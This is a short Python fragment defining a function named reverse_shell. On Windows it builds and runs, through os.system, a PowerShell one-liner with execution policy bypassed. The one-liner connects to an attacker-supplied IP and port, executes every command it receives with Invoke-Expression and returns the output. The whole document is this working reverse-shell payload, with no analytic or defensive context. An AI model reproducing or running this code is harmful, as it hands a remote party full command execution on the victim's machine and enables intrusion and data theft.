def reverse_shell(ip, port):
    import os, platform
    ip = ip
    port = port
    if(platform.system() == "Windows"):
        rev_shell = '''powershell -nop -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient(\'''' + str(ip) + '''\', ''' + str(port) + ''');$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()'''
        os.system(rev_shell)
